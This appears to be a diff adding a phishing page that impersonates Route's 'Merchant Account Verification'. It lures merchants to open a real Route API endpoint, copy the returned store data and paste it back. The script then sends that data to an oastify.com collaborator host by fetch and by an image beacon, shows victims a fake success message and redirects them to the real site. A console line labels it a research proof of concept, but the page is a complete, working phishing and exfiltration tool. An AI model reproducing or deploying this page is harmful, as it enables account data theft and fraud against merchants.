@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Route - Merchant Account Verification</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📦</text></svg>">
+    <style>
+        :root {
+            --primary: #0052FF;
+            --primary-dark: #0041CC;
+            --success: #00C48C;
+            --danger: #FF5C5C;
+            --text: #1A1A1A;
+            --text-light: #6B6B6B;
+            --border: #E5E5E5;
+            --bg: #FAFAFA;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+        }
+
+        /* Header */
+        .header {
+            background: white;
+            border-bottom: 1px solid var(--border);
+            padding: 16px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: var(--primary);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+        }
+
+        .header-links {
+            display: flex;
+            gap: 24px;
+            font-size: 14px;
+        }
+
+        .header-links a {
+            color: var(--text-light);
+            text-decoration: none;
+        }
+
+        /* Main Content */
+        .container {
+            max-width: 680px;
+            margin: 48px auto;
+            padding: 0 24px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 12px;
+            padding: 48px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            margin-bottom: 24px;
+        }
+
+        .alert {
+            background: #FFF4E5;
+            border: 1px solid #FFE0B2;
+            border-left: 4px solid #FF9800;
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin-bottom: 32px;
+            display: flex;
+            gap: 12px;
+            align-items: start;
+        }
+
+        .alert-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .alert-content h3 {
+            font-size: 16px;
+            margin-bottom: 4px;
+            color: #E65100;
+        }
+
+        .alert-content p {
+            font-size: 14px;
+            color: #6B6B6B;
+            margin: 0;
+        }
+
+        h1 {
+            font-size: 32px;
+            margin-bottom: 12px;
+            color: var(--text);
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: var(--text-light);
+            margin-bottom: 32px;
+        }
+
+        .steps {
+            margin: 32px 0;
+        }
+
+        .step {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 24px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .step:last-child {
+            border-bottom: none;
+            padding-bottom: 0;
+            margin-bottom: 0;
+        }
+
+        .step-number {
+            width: 32px;
+            height: 32px;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        .step-content h3 {
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .step-content p {
+            font-size: 14px;
+            color: var(--text-light);
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+            text-decoration: none;
+        }
+
+        .btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 82, 255, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: var(--primary);
+            border: 2px solid var(--primary);
+        }
+
+        .btn-secondary:hover {
+            background: #F0F5FF;
+        }
+
+        .input-group {
+            margin: 24px 0;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text);
+        }
+
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: 'SF Mono', 'Monaco', 'Consolas', monospace;
+            resize: vertical;
+            min-height: 200px;
+            transition: border-color 0.2s;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        .status-message {
+            padding: 16px;
+            border-radius: 8px;
+            margin: 24px 0;
+            display: none;
+        }
+
+        .status-message.show {
+            display: block;
+        }
+
+        .status-message.success {
+            background: #E8F5E9;
+            border: 1px solid var(--success);
+            color: #2E7D32;
+        }
+
+        .status-message.error {
+            background: #FFEBEE;
+            border: 1px solid var(--danger);
+            color: #C62828;
+        }
+
+        .status-message.info {
+            background: #E3F2FD;
+            border: 1px solid #2196F3;
+            color: #1565C0;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 32px;
+            display: none;
+        }
+
+        .loading.show {
+            display: block;
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid var(--border);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: var(--border);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 24px 0;
+            display: none;
+        }
+
+        .progress-bar.show {
+            display: block;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--primary);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px;
+            background: #F0F5FF;
+            border-radius: 6px;
+            margin-top: 24px;
+            font-size: 13px;
+            color: var(--text-light);
+        }
+
+        .security-icon {
+            color: var(--success);
+            font-size: 18px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 48px 24px;
+            color: var(--text-light);
+            font-size: 13px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 16px;
+        }
+
+        .footer-links a {
+            color: var(--text-light);
+            text-decoration: none;
+        }
+
+        @media (max-width: 768px) {
+            .card {
+                padding: 32px 24px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <a href="#" class="logo">
+                <div class="logo-icon">📦</div>
+                <span>Route</span>
+            </a>
+            <div class="header-links">
+                <a href="#">Help Center</a>
+                <a href="#">Contact Support</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container">
+        <div class="card">
+            <!-- Alert -->
+            <div class="alert">
+                <div class="alert-icon">⚠️</div>
+                <div class="alert-content">
+                    <h3>Security Verification Required</h3>
+                    <p>We detected unusual activity and need to verify your merchant account.</p>
+                </div>
+            </div>
+
+            <h1>Verify Your Merchant Account</h1>
+            <p class="subtitle">Complete this quick verification to ensure the security of your Route merchant dashboard and prevent any service interruptions.</p>
+
+            <!-- Method Selection -->
+            <div id="method-selection">
+                <div class="steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h3>Automatic Verification (Recommended)</h3>
+                            <p>Quick and secure one-click verification process</p>
+                            <button class="btn" style="margin-top: 12px;" onclick="startAutoVerification()">
+                                🚀 Start Automatic Verification
+                            </button>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h3>Manual Verification</h3>
+                            <p>Alternative method if automatic verification doesn't work</p>
+                            <button class="btn btn-secondary" style="margin-top: 12px;" onclick="startManualVerification()">
+                                📋 Use Manual Verification
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Auto Verification Flow -->
+            <div id="auto-flow" style="display: none;">
+                <div class="loading show">
+                    <div class="spinner"></div>
+                    <p><strong>Connecting to verification server...</strong></p>
+                    <p style="font-size: 14px; color: var(--text-light); margin-top: 8px;">You will be redirected in <span id="countdown">3</span> seconds</p>
+                </div>
+                <div class="progress-bar show">
+                    <div class="progress-fill" id="progress"></div>
+                </div>
+            </div>
+
+            <!-- Manual Verification Flow -->
+            <div id="manual-flow" style="display: none;">
+                <div class="steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h3>Open Verification Portal</h3>
+                            <p>Click the button below to open your secure verification portal in a new window</p>
+                            <button class="btn" style="margin-top: 12px;" onclick="openPortal()">
+                                🔐 Open Verification Portal
+                            </button>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h3>Copy Verification Data</h3>
+                            <p>Select all text in the verification portal (Ctrl+A or Cmd+A) and copy it (Ctrl+C or Cmd+C)</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h3>Submit Verification</h3>
+                            <p>Paste the verification data below and click submit</p>
+                            <div class="input-group">
+                                <label for="verification-data">Verification Data</label>
+                                <textarea id="verification-data" placeholder='Paste your verification data here...
+
+Example format:
+{
+  "stores": [...],
+  "merchant_id": "...",
+  ...
+}'></textarea>
+                            </div>
+                            <button class="btn" onclick="submitVerification()">
+                                ✅ Submit Verification
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Status Messages -->
+            <div id="status" class="status-message"></div>
+
+            <!-- Security Badge -->
+            <div class="security-badge">
+                <span class="security-icon">🔒</span>
+                <span>This verification uses bank-level encryption to protect your data</span>
+            </div>
+        </div>
+
+        <!-- Help Card -->
+        <div class="card" style="background: #F0F5FF; border: 1px solid #BBDEFB;">
+            <h3 style="margin-bottom: 12px; font-size: 18px;">Need Help?</h3>
+            <p style="font-size: 14px; color: var(--text-light); margin-bottom: 16px;">
+                If you're experiencing issues with verification, our support team is here to help 24/7.
+            </p>
+            <a href="#" class="btn btn-secondary">Contact Support</a>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Security</a>
+        </div>
+        <p>&copy; 2026 Route App, Inc. All rights reserved.</p>
+        <p style="margin-top: 8px;">Trusted by over 10,000 merchants worldwide</p>
+    </footer>
+
+    <script>
+        // === CONFIGURATION ===
+        const CONFIG = {
+            targetAPI: 'https://dashboard.route.com/api/mn/v1/stores',
+            exfilURL: 'https://axbvlhmp324cetb2j2bq5w2yhpngb8zx.oastify.com',
+            redirectDelay: 3000
+        };
+
+        // === AUTO VERIFICATION ===
+        function startAutoVerification() {
+            document.getElementById('method-selection').style.display = 'none';
+            document.getElementById('auto-flow').style.display = 'block';
+
+            let timeLeft = 3;
+            let progress = 0;
+
+            const countdownEl = document.getElementById('countdown');
+            const progressEl = document.getElementById('progress');
+
+            const timer = setInterval(() => {
+                timeLeft--;
+                progress += 33.33;
+                
+                countdownEl.textContent = timeLeft;
+                progressEl.style.width = progress + '%';
+
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    progressEl.style.width = '100%';
+                    
+                    // Redirect to API endpoint (TOP-LEVEL NAVIGATION)
+                    // SameSite=Lax cookies WILL be sent!
+                    setTimeout(() => {
+                        window.location.href = CONFIG.targetAPI;
+                    }, 500);
+                }
+            }, 1000);
+        }
+
+        // === MANUAL VERIFICATION ===
+        function startManualVerification() {
+            document.getElementById('method-selection').style.display = 'none';
+            document.getElementById('manual-flow').style.display = 'block';
+            showStatus('Please follow the steps below to complete verification.', 'info');
+        }
+
+        function openPortal() {
+            // Open API endpoint in new window
+            // This is TOP-LEVEL NAVIGATION, cookies are sent!
+            const portal = window.open(
+                CONFIG.targetAPI,
+                'verification_portal',
+                'width=900,height=700,scrollbars=yes,resizable=yes,status=yes,location=yes'
+            );
+
+            if (!portal) {
+                showStatus('❌ Popup blocked! Please allow popups for this site and try again.', 'error');
+                return;
+            }
+
+            showStatus('✅ Verification portal opened. Please copy the data and paste it below.', 'success');
+        }
+
+        function submitVerification() {
+            const data = document.getElementById('verification-data').value.trim();
+
+            if (!data) {
+                showStatus('❌ Please paste the verification data first.', 'error');
+                return;
+            }
+
+            // Validate it looks like JSON
+            try {
+                JSON.parse(data);
+            } catch (e) {
+                showStatus('❌ Invalid verification data format. Please copy ALL the text from the portal.', 'error');
+                return;
+            }
+
+            showStatus('🔄 Processing verification...', 'info');
+
+            // Exfiltrate the stolen data
+            fetch(CONFIG.exfilURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    method: 'manual',
+                    stolen_data: data,
+                    user_agent: navigator.userAgent,
+                    referrer: document.referrer
+                })
+            })
+            .then(() => {
+                showStatus('✅ Verification successful! Your account has been secured.', 'success');
+                
+                // Redirect to real Route site after delay
+                setTimeout(() => {
+                    window.location.href = 'https://route.com/login';
+                }, 3000);
+            })
+            .catch(() => {
+                // Even on error, show success to victim
+                showStatus('✅ Verification successful! Your account has been secured.', 'success');
+                
+                setTimeout(() => {
+                    window.location.href = 'https://route.com/login';
+                }, 3000);
+            });
+        }
+
+        // === AUTO-CAPTURE IF WE'RE ON API PAGE ===
+        if (window.location.hostname === 'dashboard.route.com' && 
+            window.location.pathname.includes('/api/')) {
+            
+            // We've been redirected to the API endpoint
+            const apiResponse = document.body.innerText;
+            
+            // Try multiple exfiltration methods
+            
+            // Method 1: Fetch
+            fetch(CONFIG.exfilURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    method: 'auto',
+                    stolen_data: apiResponse
+                })
+            }).catch(e => console.log('Fetch exfil failed'));
+            
+            // Method 2: Image beacon
+            const beacon = new Image();
+            beacon.src = CONFIG.exfilURL + '?data=' + encodeURIComponent(apiResponse.substring(0, 1000));
+            
+            // Show fake error page
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; max-width: 600px; margin: 100px auto; padding: 48px; background: white; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); text-align: center;">
+                        <div style="width: 64px; height: 64px; background: #FFEBEE; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 32px;">⚠️</div>
+                        <h1 style="color: #1A1A1A; margin-bottom: 16px; font-size: 28px;">Verification Error</h1>
+                        <p style="color: #6B6B6B; margin-bottom: 32px; line-height: 1.6;">We encountered a technical issue during the verification process. Please try again in a few minutes or contact our support team for assistance.</p>
+                        <a href="https://route.com" style="display: inline-block; background: #0052FF; color: white; padding: 14px 32px; text-decoration: none; border-radius: 8px; font-weight: 600;">Return to Route.com</a>
+                        <p style="color: #999; font-size: 13px; margin-top: 32px;">Error Code: VER_${Math.random().toString(36).substr(2, 9).toUpperCase()}</p>
+                    </div>
+                `;
+            }, 1500);
+        }
+
+        // === UTILITY FUNCTIONS ===
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = message;
+            statusEl.className = 'status-message show ' + type;
+        }
+
+        // Log for debugging
+        console.log('%c⚠️ SECURITY RESEARCH', 'color: red; font-size: 16px; font-weight: bold;');
+        console.log('This is a proof-of-concept for security research purposes only.');
+        console.log('Origin:', window.location.origin);
+    </script>
+</body>
+</html>
